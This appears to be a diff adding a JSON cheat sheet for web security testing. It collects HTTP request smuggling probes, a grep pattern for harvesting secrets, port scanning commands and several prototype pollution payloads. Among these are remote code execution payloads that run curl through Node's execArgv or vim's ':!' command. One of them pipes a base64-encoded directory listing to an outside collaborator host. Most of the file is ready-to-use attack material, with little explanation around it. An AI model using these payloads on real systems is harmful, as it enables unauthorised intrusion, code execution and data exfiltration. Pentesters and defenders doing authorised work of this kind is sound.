@@ -1,0 +1,141 @@
+[
+    {
+        "title": "Base64 Methodology",
+        "subtitle": "Decode and analyze Base64 encoded data",
+        "commands": [
+            "cat all_urls.txt | gf base64 | tee base64_raw.txt",
+            "cat base64_raw.txt | awk -F: '{print $3}' | tee base64.txt",
+            "while read line; do echo \"$line\" | base64 -d; echo; done < base64.txt"
+        ]
+    },
+    {
+        "title": "DETECTING CL.TE",
+        "subtitle": "- Timeout means success  <br> - Rejection means the backend is using TE",
+        "commands": [
+            "Content-Length: 6",
+            "Transfer-Encoding: chunked",
+            "",
+            "3",
+            "abc",
+            "X",
+            ""
+        ]
+    },
+    {
+        "title": "DETECTING TE.CL",
+        "subtitle": "Timeout means success",
+        "commands": [
+            "Content-Length: 6",
+            "Transfer-Encoding: chunked",
+            "",
+            "0",
+            "",
+            "X"
+        ]
+    },
+    {
+        "title": "GREP SECRETS",
+        "subtitle": "Grab secrets from jsfiles",
+        "commands": [
+            "grep -r -E \"aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp\""
+        ]
+    },
+    {
+        "title": "PROTOTYPE POLLUTION 1",
+        "subtitle": "Tampers with json response spacing",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"json spaces\": 100",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 2: CHARSET OVERRIDE",
+        "subtitle": "- Forces the server to render values in UTF-7 encoding if controllable. <br> - Tip: if there is a controllable value and it is reflecting, give it a value converted to utf7. <br> - After that, add the above payload to see if the charset obeyed and rendered the value in utf-7.",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"content-type\": \"application/json; charset=utf-7\"",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 3: OVERRIDING THE STATUS",
+        "subtitle": "- Overrides error status returned by the server. <br>- Tip: First send improperly formatted JSON and note the error variable.<br> - Use that variable with __proto__ to override it, then trigger the error again and check if the overridden value exists.",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"status\": 555",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 4: USING CONSTRUCTOR",
+        "subtitle": "Injects new properties into the object prototype using constructor.",
+        "commands": [
+            "\"constructor\":{",
+            "  \"prototype\":{",
+            "    \"new\":\"added\"",
+            "  }",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 5: REMOTE CODE EXECUTION",
+        "subtitle": "Abuses execArgv to execute system commands remotely.",
+        "commands": [
+            "\"__proto__\": {",
+            "  \"execArgv\":[",
+            "    \"--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')\"",
+            "  ]",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 6: RCE USING VIM",
+        "subtitle": "Sets shell to vim and abuses :! command to send request to collaborator.",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"shell\":\"vim\",",
+            "  \"input\":\":!curl https://323s6lgfrgtj5ubwohwljxy0vr1ip8dx.oastify.com\\n\"",
+            "}"
+        ]
+    },
+    {
+        "title": "PAYLOAD 7: EXTRACTING DATA",
+        "subtitle": "Exfiltrates data using vim shell and base64 encoded curl requests.",
+        "commands": [
+            "\"__proto__\":{",
+            "  \"shell\":\"vim\",",
+            "  \"input\":\":!ls | base64 |curl -d @- https://323s6lgfrgtj5ubwohwljxy0vr1ip8dx.oastify.com\\n\"",
+            "}"
+        ]
+    },
+    {
+        "title": "GET SWAGGER APIS",
+        "subtitle": "This will fetch all available swagger pages from the host file given",
+        "commands": [
+            "nuclei -list hosts_alive.txt -t /home/aceos/nuclei-templates/http/exposures/apis/swagger-api.yaml"
+        ]
+    },
+    {
+        "title": "SEMIGREP ANALYSIS",
+        "subtitle": "It does static code analysis",
+        "commands": [
+            "cat js_urls.txt | xargs -n 1 -I {} wget -q {}",
+            "semgrep --config=p/javascript ./"
+        ]
+    },
+    {
+        "title": "NON STANDARD PORTS",
+        "subtitle": "This commands scans live hosts for non standard ports",
+        "commands": [
+            "httpx -l all_subdomains.txt -ports 80,443,8080,8443,8008,8081,8011,3306,5432,6379,27017,15672,10000,9090,5900 -threads 80 -o alive.txt"
+        ]
+    },
+    {
+        "title": "FASTER PORT SCANNING WITH NAABU",
+        "subtitle": "This uses Naabu tool for scanning open ports",
+        "commands": [
+            "naabu -iL hosts_alive.txt -c 50 -nmap-cli \"nmap -sV -o naabuports.txt\""
+        ]
+    }
+]
